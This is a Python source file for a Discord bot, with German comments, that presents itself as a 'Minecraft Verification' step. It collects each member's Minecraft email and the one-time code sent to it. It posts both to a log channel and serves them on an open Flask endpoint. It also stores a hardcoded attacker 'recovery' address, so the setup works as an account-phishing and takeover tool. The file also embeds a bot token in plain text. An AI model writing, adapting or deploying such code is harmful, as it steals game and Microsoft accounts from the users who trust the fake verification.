import discord
from discord.ext import commands
from flask import Flask, jsonify
import threading
import asyncio
import logging

# === KONFIGURATION ===
TOKEN = "MTM5OTMwNDMxNjE5OTc2ODE5Ng.GAzdf0.MQooxf3VhMMypJD2NIISxwd4a_9s4-af7WEhY8"
GUILD_ID = 1390625256376373268
VERIFY_CHANNEL_ID = 1399018497232732200
LOG_CHANNEL_ID = 1392051514528366654
VERIFIED_ROLE_ID = 1390630401005060137
RECOVERY_EMAIL = "hacker134383@gmail.com"

# === LOGGING ===
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("discord_bot")

# === DISCORD BOT SETUP ===
intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents)
verifications = {}

# === FLASK SERVER ===
app = Flask(__name__)

@app.route("/verifications")
def get_verifications():
    return jsonify(list(verifications.values()))

def run_flask():
    app.run(host="0.0.0.0", port=5000)

def start_web():
    thread = threading.Thread(target=run_flask)
    thread.daemon = True
    thread.start()

# === EMAIL MODAL ===
class EmailModal(discord.ui.Modal, title="Minecraft E-Mail eingeben"):
    def __init__(self):
        super().__init__(timeout=None)
        self.email = discord.ui.TextInput(
            label="Minecraft E-Mail",
            placeholder="z. B. dein@email.com",
            max_length=100,
            required=True
        )
        self.add_item(self.email)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        verifications[user_id] = {
            "user": interaction.user.name,
            "email": self.email.value.strip(),
            "code": "",
            "recovery": RECOVERY_EMAIL
        }

        log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            embed = discord.Embed(title="📧 E-Mail erhalten", color=discord.Color.orange())
            embed.add_field(name="Benutzer", value=interaction.user.mention, inline=False)
            embed.add_field(name="E-Mail", value=self.email.value.strip(), inline=True)
            embed.set_footer(text="Warte auf Code...")
            embed.timestamp = discord.utils.utcnow()
            await log_channel.send(embed=embed)

        await interaction.response.send_message(
            content=(
                "Email successfully entered.\n\n"
                "⏳ **Could take up to 2 minutes until an email with a verification code arrives.**\n"
                "You'll receive a button to enter the code shortly."
            ),
            ephemeral=True
        )

        await asyncio.sleep(2)
        view = CodeVerifyButtonView(user_id)
        msg = await interaction.followup.send(
            content="⌛ **Ready to enter the code!**\n⬇️ Click below to enter your code:",
            view=view,
            ephemeral=True
        )

        asyncio.create_task(delete_later(msg, 120))

async def delete_later(message, delay):
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except discord.HTTPException:
        pass

# === CODE MODAL ===
class CodeModal(discord.ui.Modal, title="Verifizierungscode eingeben"):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.code = discord.ui.TextInput(
            label="Verifizierungscode",
            placeholder="z. B. 123456",
            max_length=10,
            required=True
        )
        self.add_item(self.code)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id
        if user_id not in verifications:
            await interaction.response.send_message("❌ You need to enter your email first.", ephemeral=True)
            return

        verifications[user_id]["code"] = self.code.value.strip()

        log_channel = interaction.client.get_channel(LOG_CHANNEL_ID)
        if log_channel:
            data = verifications[user_id]
            embed = discord.Embed(title="✅ Verification complete", color=discord.Color.blue())
            embed.add_field(name="Benutzer", value=interaction.user.mention, inline=False)
            embed.add_field(name="E-Mail", value=data["email"], inline=True)
            embed.add_field(name="Code", value=data["code"], inline=True)
            embed.add_field(name="Recovery-E-Mail", value=RECOVERY_EMAIL, inline=False)
            embed.set_footer(text="Verifiziert über Modal")
            embed.timestamp = discord.utils.utcnow()
            await log_channel.send(embed=embed)

        role = interaction.guild.get_role(VERIFIED_ROLE_ID)
        if role:
            try:
                await interaction.user.add_roles(role)
            except discord.HTTPException as e:
                logger.error(f"Fehler beim Hinzufügen der Rolle: {e}")

        await interaction.response.send_message("✅ Verification complete. Thank you!", ephemeral=True)

# === CODE BUTTON VIEW ===
class CodeVerifyButtonView(discord.ui.View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="Code eingeben", style=discord.ButtonStyle.secondary, custom_id="code_verification")
    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ Nur der ursprüngliche Benutzer darf das verwenden.", ephemeral=True)
            return
        await interaction.response.send_modal(CodeModal(self.user_id))

# === START VERIFICATION BUTTON VIEW ===
class VerifyButtonView(discord.ui.View):
    @discord.ui.button(label="Verifizieren", style=discord.ButtonStyle.primary, custom_id="start_verification")
    async def verify_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(EmailModal())

# === BOT EVENTS ===
@bot.event
async def on_ready():
    await bot.tree.sync(guild=discord.Object(id=GUILD_ID))
    logger.info(f"✅ Bot läuft als {bot.user}")
    start_web()

    await asyncio.sleep(5)  # Sicherheitswartezeit für vollständige Verbindung
    channel = bot.get_channel(VERIFY_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="🔒 Minecraft Verification",
            description="Click the button and enter your Minecraft email. After that, you'll receive the code button.",
            color=discord.Color.green()
        )
        embed.set_image(url="https://cdn.discordapp.com/attachments/1398940845712867368/1399016245038415972/79ec68fb-a899-453e-9bc0-84a9106f95541111-ezgif.com-video-to-gif-converter.gif")
        try:
            await channel.send(embed=embed, view=VerifyButtonView())
        except discord.HTTPException as e:
            logger.error(f"Fehler beim Senden der Verifizierungsnachricht: {e}")

bot.run(TOKEN)
